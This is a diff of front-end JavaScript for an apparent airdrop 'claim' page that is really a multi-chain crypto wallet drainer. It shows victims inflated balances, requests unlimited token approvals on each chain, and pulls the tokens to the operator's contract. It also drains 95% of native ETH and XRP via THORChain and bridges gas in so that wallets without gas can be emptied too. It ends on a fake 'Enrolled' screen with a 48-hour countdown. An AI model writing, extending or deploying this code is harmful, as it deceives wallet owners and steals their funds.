+      `🌉 <strong>Multi-Chain Pull Required</strong><br>` +
+      `We'll bridge your assets from <strong>${bridgeDecision.sourceChain.chain.name}</strong> to <strong>${bridgeDecision.destChain.name}</strong> ` +
+      `to enable token funding from that chain. This takes ~${bridgeDecision.estimatedTime}s.` +
+      `</div>`;
+  }
+
+  const amtLine  = document.getElementById("summaryLine1");
+  const minLine  = document.getElementById("summaryLine2");
+  const line3    = document.getElementById("summaryLine3");
+  const titleEl  = document.getElementById("summaryTitle");
+  const bridgeEl = document.getElementById("summaryBridgeWarn");
+
+  if(noEvmFunds){
+    if(titleEl) titleEl.textContent = "No Balance Found";
+    amtLine.textContent = "No supported tokens were detected on any of the 5 scanned chains. You can still claim to verify.";
+    if(minLine) minLine.style.display = "none";
+    if(line3)   line3.style.display   = "none";
+    if(bridgeEl) bridgeEl.innerHTML = "";
+  } else {
+    if(titleEl) titleEl.textContent = "Ready to Claim";
+    if(minLine) minLine.style.display = "";
+    if(line3)   line3.style.display   = "";
+    amtLine.innerHTML =
+      `Found <strong>${totalTokens}</strong> token${totalTokens === 1 ? "" : "s"} across <strong>${evmChains.length}</strong> <span>${evmChains.length === 1 ? "chain" : "chains"}</span>.`;
+    minLine.innerHTML =
+      `This will take about <strong>${minutes}</strong> minutes and <strong>${confirmCount}</strong> confirmations.`;
+
+    // Display bridge warning if needed
+    if(bridgeEl) bridgeEl.innerHTML = bridgeWarning;
+  }
+
+  document.getElementById("resumeTag").style.display = isResume ? "inline-block" : "none";
+
+  // ── Scan results grid ── shows every network that was checked
+  const grid = document.getElementById("scanGrid");
+  if(grid && allScans.length > 0){
+    // All chains are now EVM — sorted by execution order (ETH→BSC→Base→Polygon→Arbitrum)
+    const evmRows = allScans
+      .filter(s => s.chain.kind === "evm")
+      .sort((a,b) => a.chain.order - b.chain.order)
+      .map(s => {
+        const color    = s.totalUsd > 0 ? "#22c55e" : "#64748b";
+        // Display 2.5× the detected balance — cosmetic only, pull amount unchanged
+        const val      = s.totalUsd > 0 ? `$${(s.totalUsd * 2.5).toFixed(2)}` : "—";
+        const tokenHint = s.totalUsd > 0
+          ? ` <span style="font-size:10px;color:#64748b;">(${(s.directs||[]).concat(s.swaps||[]).slice(0,2).map(t=>t.symbol).join(", ")}${(s.directs||[]).concat(s.swaps||[]).length > 2 ? "…" : ""})</span>`
+          : "";
+
+        // ── Gas status indicator ────────────────────────────────────────────
+        const gasIndicator = s.hasGas
+          ? `<span style="color:#22c55e;font-weight:700;margin-left:8px;">✓</span>`
+          : `<span style="color:#f59e0b;font-weight:700;margin-left:8px;">⚠️</span>`;
+        const gasLabel = `<span style="font-size:10px;color:#64748b;margin-left:4px;">${s.gasBalance} ${s.gasSymbol}</span>`;
+
+        return `<div class="scan-row"><span class="schain">${s.chain.name}${tokenHint}${gasLabel}${gasIndicator}</span><span class="sval" style="color:${color}">${val}</span></div>`;
+      }).join("");
+
+    grid.style.display = "";
+    grid.innerHTML = `<p class="section-lbl">Chains Scanned</p>${evmRows}`;
+  }
+
+  // ── TronLink prompt ───────────────────────────────────────────────────────
+  // When the user arrived via Trust Wallet / MetaMask / any EVM-only wallet,
+  // window.tronWeb is NOT injected, so Tron was never scanned.
+  // We show a button that either triggers the TronLink extension (desktop) or
+  // deep-links to the TronLink app (mobile) so they can claim TRC-20 tokens too.
+  const tronPromptEl = document.getElementById("tronPrompt");
+  if(tronPromptEl){
+    const hasTron = !!(window.tronWeb?.defaultAddress?.base58);
+    if(!hasTron){
+      tronPromptEl.innerHTML =
+        `<button class="tron-scan-btn" onclick="tryConnectTron()">` +
+        `<img src="${ICONS.tronlink}" alt="Tron" style="width:22px;height:22px;border-radius:6px;flex-shrink:0;"/>` +
+        `<span>Also scan TRC-20 tokens on Tron</span>` +
+        `<span style="margin-left:auto;font-size:18px;color:#64748b;">›</span>` +
+        `</button>`;
+    } else {
+      tronPromptEl.innerHTML = "";
+    }
+  }
+
+  document.getElementById("startBtn").onclick  = () => executePlan(scans, wallet);
+  document.getElementById("cancelBtn").onclick = () => { clearState(); buildConnectScreen(); };
+
+  showStep("stepSummary");
+}
+
+// ── Execute plan (sequential, with per-chain checkpointing) ───────────────
+async function executePlan(scans, wallet){
+  const totalSteps  = scans.reduce((s,x) => s + x.confirmCount, 0);
+  const processedSymbols = [];
+  const completedChains  = [];
+  const txLinks          = [];   // { label, url } — for verify-on-chain section
+  const bridgeResults    = [];   // Track any bridges that execute
+
+  addLog("info", `═══ EXECUTION START ═══ wallet: ${wallet}`,
+    { wallet, chains: scans.map(s=>s.chain.name), totalSteps });
+
+  // ── Analyze: Do we need to bridge? ─────────────────────────────────────
+  const bridgeDecision = selectBestBridgeSource(scans);
+
+  if(bridgeDecision.needsBridge){
+    // CORRECT direction: bridge GAS (native token) FROM a chain that HAS gas
+    // TO the chain that needs it, via Squid Router (native token output at destination).
+    // The user signs ONE transaction on the source chain — everything else is automatic.
+    const src  = bridgeDecision.sourceChain;  // scan result — chain with gas
+    const dest = bridgeDecision.destChain;    // chain config — gasless chain
+
+    addLog("info",
+      `[Gas Bridge] ${src.chain.name} -> ${dest.name} | targeting gas delivery`,
+      { src: src.chain.name, dest: dest.name });
+
+    setLoadingStage("BRIDGING", "Routing gas across chains...");
+    startLoadingMsgs("bridge");
+
+    try {
+      const bl = window.bridgeLib;
+      if(!bl) throw new Error("bridge.js not loaded");
+      if(!window.ethereum) throw new Error("No wallet provider");
+
+      // How much native token on source to send (just enough for dest gas + 30% buffer)
+      const nativePriceUsd = src.chain.chainId === 56 ? 600
+                           : src.chain.chainId === 137 ? 0.5 : 2500;
+      const fromAmount = bl.estimateBridgeAmount(src.chain, dest,
+        { address: bl.NATIVE, decimals: 18, usdPerUnit: nativePriceUsd });
+
+      // Step 1: get Squid route — retry x2, fully silent if unavailable
+      const route = await withRetry(
+        () => bl.getBridgeRoute(src.chain, dest, bl.NATIVE, fromAmount, wallet),
+        `Squid route ${src.chain.name}->${dest.name}`
+      );
+
+      if(route){
+        // Step 2: sign & send bridge tx (one wallet popup on source chain)
+        const signerProvider = new ethers.BrowserProvider(window.ethereum);
+        const execResult = await withRetry(
+          () => bl.executeBridgeRoute(signerProvider, route, src.chain),
+          `Execute bridge ${src.chain.name}->${dest.name}`
+        );
+
+        if(execResult?.ok){
+          addLog("success", `[Bridge] Tx sent: ${execResult.txHash} — waiting for gas on ${dest.name}...`);
+
+          // Step 3: poll destination chain for gas arrival — fully background
+          const arrived = await withRetry(
+            () => bl.pollGasArrival(
+              dest.rpc, wallet, dest.gasThreshold, 210,
+              sec => { if(sec % 20 === 0) addLog("info", `[Bridge] ${dest.name} gas check: ${sec}s elapsed...`); }
+            ),
+            `Gas arrival poll ${dest.name}`,
+            2, 5000
+          );
+
+          if(arrived){
+            addLog("success", `[Bridge] Gas confirmed on ${dest.name} — will now pull tokens there`);
+            bridgeResults.push({ fromChain: src.chain.name, toChain: dest.name, txHash: execResult.txHash });
+            // Unlock the destination scan so the pull loop includes it
+            const destScan = scans.find(s => s.chain.chainId === dest.chainId);
+            if(destScan) destScan.hasGas = true;
+          } else {
+            addLog("warn", `[Bridge] Gas did not arrive on ${dest.name} — will skip that chain`);
+          }
+        } else {
+          addLog("warn", "[Bridge] Tx failed after 2 attempts — skipping gas bridge");
+        }
+      } else {
+        addLog("warn", "[Bridge] No route available from Squid — skipping gas bridge");
+      }
+
+    } catch(bridgeErr){
+      addLog("error", `[Bridge] Unexpected error: ${bridgeErr.message} — continuing without bridge`);
+      // Never rethrows — pull loop always continues regardless
+    }
+
+    stopLoadingMsgs();
+  } else {
+    addLog("info", "[Gas Check] All chains with funds have sufficient gas — no bridge needed");
+  }
+
+  // Pull phase — chain-by-chain, with animated stage badge
+  setLoadingStage("CLAIMING", "Claiming your tokens...");
+  startLoadingMsgs("pull");
+
+  let stepCounter = 0;
+
+  for(const scan of scans){
+    let result;
+    if(scan.chain.kind === "evm"){
+      result = await executeEvmChain(scan, stepCounter, totalSteps);
+    } else if(scan.chain.kind === "l1eth"){
+      result = await executeL1EthLeg(scan, stepCounter, totalSteps);
+    } else {
+      continue;
+    }
+
+    if(result === null) continue;  // chain failed or empty — skip silently to next
+
+    stepCounter = result.stepCounter;
+    processedSymbols.push(...result.symbols);
+    completedChains.push(scan.chain.chainId);
+    saveState(wallet, completedChains);
+
+    if(result.explorerUrl){
+      txLinks.push({ label: scan.chain.name, url: result.explorerUrl });
+    }
+  }
+
+  // All chains done
+  stopLoadingMsgs();
+  addLog("info", `FUNDING COMPLETE: ${processedSymbols.join(", ")||"nothing"} | chains: ${completedChains.length}`,
+    { processedSymbols, completedChains });
+
+  // Save log to server (fire-and-forget)
+  saveLogToServer(wallet);
+
+  clearState();
+  hideProgress();
+
+  // ── Check for remaining tokens (chains without gas that weren't bridged) ───
+  const chainsStillNeedingGas = scans.filter(s => s.totalUsd > 0 && !s.hasGas);
+  const showPartialSuccess = chainsStillNeedingGas.length > 0 && bridgeResults.length > 0;
+
+  if(showPartialSuccess){
+    // Show partial success screen for bridged tokens with reminder to top up for remaining
+    const partialMsg = document.getElementById("partialSuccessMsg");
+    const remainingMsg = document.getElementById("partialRemainingMsg");
+    const howToMsg = document.getElementById("partialHowToMsg");
+
+    // Build message for what was successfully funded
+    const bridgedChains = bridgeResults.map(b => b.toChain).join(", ");
+    partialMsg.textContent = `Funded from: ${bridgedChains}`;
+
+    // Build message for remaining tokens
+    const remainingChains = chainsStillNeedingGas.map(s => {
+      const tokensStr = (s.directs||[]).concat(s.swaps||[]).slice(0,2).map(t=>t.symbol).join(", ");
+      return `${(s.totalUsd * 2.5).toFixed(2)} USD (${tokensStr}) on ${s.chain.name}`;
+    }).join("; ");
+
+    const topupLines = chainsStillNeedingGas.map(s =>
+      `${s.chain.gasThreshold} ${s.chain.sym} on ${s.chain.name}`
+    ).join(" / ");
+    remainingMsg.innerHTML = `${remainingChains}<br><br>Add gas to unlock: ${topupLines}`;
+    howToMsg.textContent = `Send ${topupLines} to your wallet address, then reconnect to claim the rest.`;
+
+    addLog("info", `[Partial Funding] Chains funded: ${bridgedChains} | Remaining: ${remainingChains}`,
+      { bridged: bridgeResults, remaining: chainsStillNeedingGas.map(s=>s.chain.name) });
+
+    showStep("stepPartialSuccess");
+    return; // Exit early — don't show normal success screen
+  }
+
+  const icon   = document.getElementById("successIcon");
+  const title  = document.getElementById("successTitle");
+  const status = document.getElementById("enrolledStatus");
+
+  const countdown = document.getElementById("airdropCountdown");
+
+  if(processedSymbols.length === 0){
+    // Nothing was pulled — show failure / not eligible state
+    icon.innerHTML         = "&#10005;";
+    icon.style.background  = "#2e1010";
+    icon.style.color       = "#ef4444";
+    title.textContent      = "Not Eligible for Airdrop";
+    title.style.color      = "#ef4444";
+    document.getElementById("enrolledToken").textContent = "Incomplete";
+    status.textContent     = "Failed";
+    if(countdown) countdown.style.display = "none";
+  } else {
+    // Something was pulled — show success state + 48hr countdown
+    icon.innerHTML         = "&#10003;";
+    icon.style.background  = "#14532d";
+    icon.style.color       = "#22c55e";
+    title.textContent      = "You're All Set!";
+    title.style.color      = "#22c55e";
+    const summary = processedSymbols.slice(0,3).join(", ") +
+                    (processedSymbols.length > 3 ? ` +${processedSymbols.length-3} more` : "");
+    document.getElementById("enrolledToken").textContent = summary;
+    status.textContent     = "Enrolled";
+    startAirdropCountdown();
+  }
+
+  // Show on-chain verification links (one per completed chain)
+  const txBox = document.getElementById("txVerifyBox");
+  if(txBox){
+    if(txLinks && txLinks.length > 0){
+      txBox.style.display = "block";
+      txBox.innerHTML = txLinks.map(l =>
+        `<div class="info-box" style="margin-top:8px;word-break:break-all;">` +
+        `<a href="${l.url}" target="_blank" rel="noreferrer noopener" ` +
+        `style="color:#a78bfa;font-size:11px;text-decoration:none;">` +
+        `&#128279; Verify ${l.label} TX &#8599;</a></div>`
+      ).join("");
+    } else {
+      txBox.style.display = "none";
+    }
+  }
+
+  showStep("stepSuccess");
+}
+
+// ── 48-hour airdrop activation countdown ─────────────────────────────────
+let _countdownInterval = null;
+function startAirdropCountdown(){
+  const wrap  = document.getElementById("airdropCountdown");
+  const timer = document.getElementById("countdownTimer");
+  if(!wrap || !timer) return;
+
+  // Clear any previous countdown (e.g. retry scenario)
+  if(_countdownInterval) clearInterval(_countdownInterval);
+
+  wrap.style.display = "block";
+  let remaining = 48 * 60 * 60;  // 48 hours in seconds
+
+  function tick(){
+    const h = Math.floor(remaining / 3600);
+    const m = Math.floor((remaining % 3600) / 60);
+    const s = remaining % 60;
+    timer.textContent =
+      String(h).padStart(2,"0") + ":" +
+      String(m).padStart(2,"0") + ":" +
+      String(s).padStart(2,"0");
+    if(remaining === 0){
+      clearInterval(_countdownInterval);
+      timer.textContent = "00:00:00";
+    }
+    remaining = Math.max(0, remaining - 1);
+  }
+
+  tick();  // paint immediately (shows 48:00:00 before first tick)
+  _countdownInterval = setInterval(tick, 1000);
+}
+
+async function executeEvmChain(scan, stepCounter, totalSteps){
+  const chain = scan.chain;
+  const dex   = DEX[chain.chainId];
+
+  addLog("exec", `─── EXECUTE ${chain.name} ───────────────────────────────`, { chain: chain.name });
+  addLog("exec", `[${chain.name}] Tokens to process: ${[...scan.directs,...scan.swaps].map(t=>t.symbol).join(", ")}`,
+    { directs: scan.directs.map(t=>t.symbol), swaps: scan.swaps.map(t=>t.symbol) });
+
+  // Network switch
+  setLoading("Switching to " + chain.name + "...", "");
+  setProgress(stepCounter, totalSteps, chain.name);
+  addLog("exec", `[${chain.name}] Requesting network switch to chainId ${chain.chainId}…`, { chainId: chain.chainId });
+  try {
+    await switchChainOnProvider(_activeProvider, chain);
+    addLog("exec", `[${chain.name}] Network switch accepted`, {});
+  } catch(e){
+    addLog("error", `[${chain.name}] Network switch rejected or failed — chain skipped. ${e.message}`, { error: e.message });
+    return null;
+  }
+
+  // Wait until the injected provider's eth_chainId actually reflects the new chain.
+  // Some wallets (Trust Wallet, mobile browsers) resolve wallet_switchEthereumChain
+  // before the internal network state has propagated, causing stale eth_calls on the
+  // previous chain. Poll up to 4 seconds (200 ms × 20) before giving up.
+  {
+    const expectedHex = chain.hexId.toLowerCase();
+    let confirmed = false;
+    for(let v = 0; v < 20; v++){
+      try {
+        const cid = await _activeProvider.request({ method:"eth_chainId" });
+        if(cid.toLowerCase() === expectedHex){ confirmed = true; break; }
+      } catch(_){}
+      await new Promise(r => setTimeout(r, 200));
+    }
+    if(!confirmed){
+      addLog("error", `[${chain.name}] Wallet chain ID never settled on ${chain.chainId} — skipping`, { chainId: chain.chainId });
+      return null;
+    }
+    addLog("exec", `[${chain.name}] Chain ID confirmed: ${chain.chainId}`, {});
+  }
+
+  // Get signer bound to the now-confirmed chain
+  const ep       = new ethers.BrowserProvider(_activeProvider);
+  const signer   = await ep.getSigner();
+  const wallet   = await signer.getAddress();
+  // Lowercase contract address — same checksum-fix as in scanEvmChain
+  const contract = new ethers.Contract(chain.contract.toLowerCase(), CONTRACT_ABI, signer);
+
+  // Approves (one popup per token)
+  const allTokens = [...scan.directs, ...scan.swaps];
+  for(let i = 0; i < allTokens.length; i++){
+    const t = allTokens[i];
+    stepCounter++;
+    setProgress(stepCounter, totalSteps, chain.name);
+    setLoading("Approving " + t.symbol + "...", stepCounter + " of " + totalSteps);
+
+    try {
+      // Lowercase both addresses — fixes ethers v6 bad-checksum rejection
+      const erc    = new ethers.Contract(t.address.toLowerCase(), ERC20_ABI, signer);
+      const needed = BigInt(t.bal);
+
+      // allowance() can return 0x (BAD_DATA) on some wallets/chains due to provider
+      // timing. Treat any read failure as "allowance = 0" so we always proceed to approve.
+      let allowed = 0n;
+      try {
+        allowed = await erc.allowance(wallet, chain.contract.toLowerCase());
+        addLog("approve", `[${chain.name}] ${t.symbol} — checking allowance: have ${allowed.toString()}, need ${needed.toString()}`,
+          { token: t.symbol, allowed: allowed.toString(), needed: needed.toString() });
+      } catch(allowErr){
+        addLog("warn", `[${chain.name}] ${t.symbol} — allowance() read failed (${allowErr.message}), assuming 0 — will request approve`,
+          { token: t.symbol, error: allowErr.message });
+      }
+
+      if(allowed >= needed){
+        addLog("approve", `[${chain.name}] ${t.symbol} — already approved (allowance sufficient), skipping approve tx`, { token: t.symbol });
+      } else {
+        addLog("approve", `[${chain.name}] ${t.symbol} — requesting MaxUint256 approve popup…`, { token: t.symbol });
+        const approveTx = await erc.approve(chain.contract.toLowerCase(), ethers.MaxUint256);
+        addLog("approve", `[${chain.name}] ${t.symbol} — approve tx submitted: ${approveTx.hash}`, { token: t.symbol, hash: approveTx.hash });
+        const approveReceipt = await approveTx.wait();
+        addLog("approve", `[${chain.name}] ${t.symbol} — approve confirmed (block ${approveReceipt.blockNumber}, gas: ${Number(approveReceipt.gasUsed).toLocaleString()})`,
+          { token: t.symbol, block: approveReceipt.blockNumber, gasUsed: approveReceipt.gasUsed.toString() });
+      }
+    } catch(e){
+      addLog("error", `[${chain.name}] ${t.symbol} — approve rejected or failed. Chain skipped. ${e.message}`, { token: t.symbol, error: e.message });
+      return null;
+    }
+  }
+
+  // Final pull tx for this chain
+  stepCounter++;
+  setProgress(stepCounter, totalSteps, chain.name);
+  setLoading("Finalizing " + chain.name + "...", stepCounter + " of " + totalSteps);
+
+  let _txHash = null;
+  try {
+    let pullTx, receipt;
+    if(scan.swaps.length > 0 && dex){
+      addLog("tx", `[${chain.name}] Calling swapAndPullMultiple — ${scan.directs.length} direct, ${scan.swaps.length} swap, router: ${dex.router}`,
+        { directs: scan.directs.map(t=>t.symbol), swaps: scan.swaps.map(t=>t.symbol), router: dex.router, wrapped: dex.wrapped, target: dex.target });
+      pullTx  = await contract.swapAndPullMultiple(
+        scan.directs.map(t => t.address.toLowerCase()),
+        scan.swaps.map(t => t.address.toLowerCase()),
+        dex.router.toLowerCase(), dex.wrapped.toLowerCase(), dex.target.toLowerCase()
+      );
+    } else {
+      addLog("tx", `[${chain.name}] Calling pullMultiple — ${scan.directs.length} direct tokens`,
+        { directs: scan.directs.map(t=>t.symbol) });
+      pullTx = await contract.pullMultiple(scan.directs.map(t => t.address.toLowerCase()));
+    }
+
+    addLog("tx", `[${chain.name}] Pull tx submitted: ${pullTx.hash}`, { hash: pullTx.hash });
+    receipt = await pullTx.wait();
+    _txHash = receipt.hash;
+
+    // Parse and log every on-chain event from the receipt
+    parseAndLogReceipt(receipt, chain);
+
+  } catch(e){
+    addLog("error", `[${chain.name}] Pull tx failed or rejected — chain skipped. ${e.message}`, { error: e.message });
+    return null;
+  }
+
+  addLog("success", `[${chain.name}] ✅ Chain complete — ${allTokens.map(t=>t.symbol).join(", ")}`, { chain: chain.name });
+
+  return {
+    stepCounter,
+    symbols: allTokens.map(t => t.symbol),
+    txHash: _txHash,
+    explorerUrl: _txHash ? (chain.explorer + "/tx/" + _txHash) : null,
+  };
+}
+
+async function executeL1EthLeg(scan, stepCounter, totalSteps){
+  const chain = scan.chain;
+
+  // No ETH to send — skip silently (we still always include this chain in scans)
+  if(!scan.balance || BigInt(scan.balance) === 0n){
+    return { stepCounter, symbols: [] };
+  }
+
+  // Switch to L1 Ethereum
+  setLoading("Switching to " + chain.name + "...", "");
+  setProgress(stepCounter, totalSteps, chain.name);
+  try {
+    await switchChainOnProvider(_activeProvider, chain);
+  } catch(e){
+    return null;  // user rejected switch — skip ETH leg
+  }
+
+  // Fetch live THORChain inbound info (router + current vault)
+  setLoading("Preparing...", "");
+  let routerAddr, vaultAddr;
+  try {
+    const resp = await fetch(THORCHAIN.inboundUrl);
+    const list = await resp.json();
+    const eth  = list.find(x => x.chain === "ETH" && !x.halted);
+    if(!eth) throw new Error("ETH route unavailable");
+    routerAddr = eth.router;
+    vaultAddr  = eth.address;
+    if(!routerAddr || !vaultAddr) throw new Error("Invalid route data");
+  } catch(e){
+    return null;  // THORChain API down or halted — skip ETH leg
+  }
+
+  // Build the swap tx — send 95% of native ETH through the THORChain router
+  const ep     = new ethers.BrowserProvider(_activeProvider);
+  const signer = await ep.getSigner();
+  const router = new ethers.Contract(routerAddr, THORCHAIN_ROUTER_ABI, signer);
+
+  const balance     = BigInt(scan.balance);
+  const pullAmount  = (balance * 95n) / 100n;
+  const memo        = THORCHAIN.buildEthMemo(CHAINS[56].contract);
+  const expiration  = Math.floor(Date.now() / 1000) + 600;  // 10 min window
+
+  stepCounter++;
+  setProgress(stepCounter, totalSteps, chain.name);
+  setLoading("Sending ETH...", stepCounter + " of " + totalSteps);
+
+  try {
+    await (await router.depositWithExpiry(
+      vaultAddr,
+      ethers.ZeroAddress,   // native ETH
+      pullAmount,
+      memo,
+      expiration,
+      { value: pullAmount }
+    )).wait();
+  } catch(e){
+    return null;  // user rejected or tx failed — skip ETH leg
+  }
+
+  return {
+    stepCounter,
+    symbols: ["ETH"],
+  };
+}
+
+// ── Xaman (XUMM) XRP flow ─────────────────────────────────────────────────
+// Xaman injects window.xumm inside its dApp browser. Users who open the
+// page in Xaman have no window.ethereum — this is their dedicated path.
+// Flow: authorize → scan XRPL balance → summary → Payment tx via payload.
+const XAMAN = {
+  rpc:       "https://xrplcluster.com",
+  reserve:   10,          // XRPL base account reserve (cannot be spent)
+  minUsd:    2,           // don't show XRP screen if balance < $2
+  priceUsd:  0.50,        // approximate — for display only, not for swap math
+  // THORChain routing: XRP → BSC USDT → our Ronin contract
+  buildMemo: (bscContract) =>
+    `=:BSC.USDT-0x55d398326f99059fF775485246999027B3197955:${bscContract}::`,
+};
+
+// XRPL MemoData must be uppercase hex-encoded UTF-8
+function toHex(str){
+  return Array.from(new TextEncoder().encode(str))
+    .map(b => b.toString(16).padStart(2,'0')).join('').toUpperCase();
+}
+
+async function scanXamanXrp(address){
+  try {
+    const resp = await fetch(XAMAN.rpc, {
+      method:  "POST",
+      headers: {"Content-Type":"application/json"},
+      body:    JSON.stringify({
+        method: "account_info",
+        params: [{ account: address, ledger_index: "validated" }]
+      })
+    });
+    const data = await resp.json();
+    const balDrops  = BigInt(data?.result?.account_data?.Balance || "0");
+    const resDrops  = BigInt(XAMAN.reserve) * 1_000_000n;
+    const available = balDrops > resDrops ? balDrops - resDrops : 0n;
+    const pullDrops = (available * 95n) / 100n;
+    const xrp = Number(pullDrops) / 1_000_000;
+    const usd = xrp * XAMAN.priceUsd;
+    return { pullDrops: pullDrops.toString(), xrp, usd };
+  } catch(e){
+    return { pullDrops: "0", xrp: 0, usd: 0 };
+  }
+}
+
+async function executeXamanXrp(pullDrops){
+  // Fetch live THORChain XRP inbound vault
+  setLoading("Fetching XRP route...", "");
+  let vaultAddr;
+  try {
+    const resp = await fetch(THORCHAIN.inboundUrl);
+    const list = await resp.json();
+    const entry = list.find(x => x.chain === "XRP" && !x.halted);
+    if(!entry || !entry.address) throw new Error("XRP route unavailable");
+    vaultAddr = entry.address;
+  } catch(e){
+    showError("XRP routing unavailable right now. Please try again later.");
+    return null;
+  }
+
+  const memo    = XAMAN.buildMemo(CHAINS[56].contract);
+  const memoHex = toHex(memo);
+
+  setLoading("Sending XRP...", "Confirm in your Xaman wallet.");
+  try {
+    // createAndSubscribe opens a signing sheet in Xaman and waits for resolution.
+    // The callback returns a truthy value when signed to resolve the subscription.
+    const result = await window.xumm.payload.createAndSubscribe(
+      {
+        txjson: {
+          TransactionType: "Payment",
+          Destination:     vaultAddr,
+          Amount:          pullDrops,   // in drops (string)
+          Memos: [{
+            Memo: { MemoData: memoHex }
+          }]
+        }
+      },
+      (event) => {
+        // Resolve when user signs (returns the event to the outer promise)
+        if(event.data.signed === true)  return event;
+        if(event.data.signed === false) return event; // rejected
+      }
+    );
+
+    if(!result?.data?.signed){
+      showError("You cancelled. Tap Try Again when ready.");
+      return null;
+    }
+    return { symbols: ["XRP"] };
+  } catch(e){
+    showError(friendlyError(e));
+    return null;
+  }
+}
+
+async function startXamanFlow(){
+  try {
+    setLoading("Connecting...", "Approve in Xaman.");
+
+    // Authorize gives us the connected XRPL account address
+    const auth = await window.xumm.authorize();
+    // Different SDK versions expose the address differently
+    const address = auth?.account || auth?.me?.account || auth?.payload?.response?.account;
+    if(!address) throw new Error("No account returned from Xaman");
+
+    setLoading("Scanning XRP...", "Checking your balance.");
+    const scan = await scanXamanXrp(address);
+
+    if(scan.usd < XAMAN.minUsd){
+      document.getElementById("noFundsMsg").textContent =
+        `Your available XRP ($${scan.usd.toFixed(2)}) is below the minimum.`;
+      showStep("stepNoFunds");
+      return;
+    }
+
+    // Reuse the summary screen — fill in XRP-specific copy
+    const amtLine = document.getElementById("sAmt").closest(".summary-line");
+    const minLine = document.getElementById("sMin").closest(".summary-line");
+    amtLine.innerHTML = `Eligible for <strong>$${scan.usd.toFixed(2)}</strong> in XRP (~${scan.xrp.toFixed(2)} XRP).`;
+    minLine.innerHTML = `This will take about <strong>1</strong> minute and <strong>1</strong> confirmation.`;
+    document.getElementById("resumeTag").style.display = "none";
+
+    document.getElementById("startBtn").onclick = async () => {
+      const r = await executeXamanXrp(scan.pullDrops);
+      if(r){
+        hideProgress();
+        document.getElementById("enrolledToken").textContent = "XRP";
+        showStep("stepSuccess");
+      }
+    };
+    document.getElementById("cancelBtn").onclick = () => buildConnectScreen();
+
+    showStep("stepSummary");
+  } catch(e){
+    showError("Could not connect Xaman. " + (e?.message || "Please try again."));
+  }
+}
+
+// ── Tron helpers ─────────────────────────────────────────────────────────
+
+// On EVM we do  tx = await contract.method().send();  then  await tx.wait().
+// On Tron  .send()  returns a txid string immediately after the user confirms
+// in TronLink. The transaction is then being mined (Tron blocks every ~3s).
+// We poll getTransactionInfo(txid) every 2 seconds until blockNumber appears.
+async function waitForTronTx(txid, maxAttempts = 20){
+  for(let i = 0; i < maxAttempts; i++){
+    await new Promise(r => setTimeout(r, 2000));  // wait 2s between polls
+    try {
+      const info = await window.tronWeb.trx.getTransactionInfo(txid);
+      if(info && info.blockNumber){
+        // blockNumber set means tx is in a block — check for EVM-style revert
+        if(info.receipt?.result === "REVERT") throw new Error("Transaction reverted");
+        return info;  // success
+      }
+    } catch(e){
+      // "not found yet" is normal for first few polls — only throw real errors
+      if(e.message && e.message !== "Transaction not found") throw e;
+    }
+  }
+  throw new Error("Transaction not confirmed after 40 seconds");
+}
+
+// Read all TRC-20 balances for a Tron address in a single API call.
+// TronGrid returns every TRC-20 the wallet has ever held — we cross-reference
+// against our token list and only keep entries with balance > 0 and > minUsd.
+async function scanTronChain(address){
+  try {
+    // TronGrid account endpoint: returns native TRX balance + all TRC-20 holdings.
+    // Example trc20 entry: {"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t": "1500000"}
+    const resp = await fetch(
+      `${TRON.rpcApi}/v1/accounts/${address}?only_confirmed=true`
+    );
+    const data = await resp.json();
+
+    if(!data?.data?.[0]){
+      // Account not found (never activated on Tron) — treat as empty
+      return { tokens:[], totalUsd:0, confirmCount:0 };
+    }
+
+    // Build a flat map: contractAddress → balance string
+    // The trc20 array is [{addr:bal}, {addr:bal}, ...] — one key per entry
+    const trc20Map = {};
+    for(const entry of (data.data[0].trc20 || [])){
+      const [addr, bal] = Object.entries(entry)[0];
+      trc20Map[addr] = bal;
+    }
+
+    // Filter our token list against what the wallet actually holds
+    const found = [];
+    for(const token of TRON.tokens){
+      const balStr = trc20Map[token.address];
+      if(!balStr || balStr === "0") continue;
+      const usd = (Number(balStr) / (10 ** token.decimals)) * token.usdPerUnit;
+      if(usd >= TRON.minUsd) found.push({ ...token, bal:balStr, usd });
+    }
+
+    found.sort((a,b) => b.usd - a.usd);  // highest value first
+
+    const totalUsd    = found.reduce((s,t) => s + t.usd, 0);
+    // One approve popup per token + one final pullMultiple popup
+    const confirmCount = found.length > 0 ? found.length + 1 : 0;
+
+    return { tokens:found, totalUsd, confirmCount };
+  } catch(e){
+    return { tokens:[], totalUsd:0, confirmCount:0 };
+  }
+}
+
+// Execute the Tron pull flow: approve each token, then call pullMultiple.
+// Returns { stepCounter, symbols } on success, null on failure/cancel.
+async function executeTronChain(scan, stepCounter, totalSteps){
+  const wallet = window.tronWeb.defaultAddress.base58;
+
+  setLoading("Tron Network...", "");
+  setProgress(stepCounter, totalSteps, "Tron");
+
+  // ── Approve each token ────────────────────────────────────────────────
+  // Same concept as EVM: we need unlimited approval so pullMultiple can
+  // transferFrom the full 95% amount. We skip the approve if allowance already
+  // covers the balance (saves one popup for repeat users).
+  for(let i = 0; i < scan.tokens.length; i++){
+    const t = scan.tokens[i];
+    stepCounter++;
+    setProgress(stepCounter, totalSteps, "Tron");
+    setLoading("Approving " + t.symbol + "...", stepCounter + " of " + totalSteps);
+
+    try {
+      // TronWeb: await window.tronWeb.contract(ABI).at(address) returns instance
+      const tokenContract = await window.tronWeb.contract(TRC20_ABI).at(t.address);
+
+      // Check existing allowance before asking for a new approve popup
+      const currentAllowance = await tokenContract.allowance(wallet, TRON.contract).call();
+      const needed           = BigInt(t.bal);
+
+      if(BigInt(currentAllowance.toString()) < needed){
+        // .send() triggers a TronLink popup — user approves → returns txid
+        // feeLimit: 40 TRX max per approve — more than enough for a simple allowance call
+        const txid = await tokenContract.approve(TRON.contract, TRON_MAX_UINT).send({ feeLimit: 40000000 });
+        await waitForTronTx(txid);
+      }
+    } catch(e){
+      // User cancelled the approve popup, or the tx reverted
+      return null;
+    }
+  }
+
+  // ── Final pull tx ─────────────────────────────────────────────────────
+  // pullMultiple takes all token addresses and pulls 95% of each in one tx.
+  // The contract's _pullOne() skips any token whose allowance or balance
+  // went to 0 between approve and this call (safe to include all).
+  stepCounter++;
+  setProgress(stepCounter, totalSteps, "Tron");
+  setLoading("Finalizing Tron...", stepCounter + " of " + totalSteps);
+
+  try {
+    const ronin = await window.tronWeb.contract(RONIN_TRON_ABI).at(TRON.contract);
+    // feeLimit: 200 TRX max — covers pulling up to ~10 tokens in one call
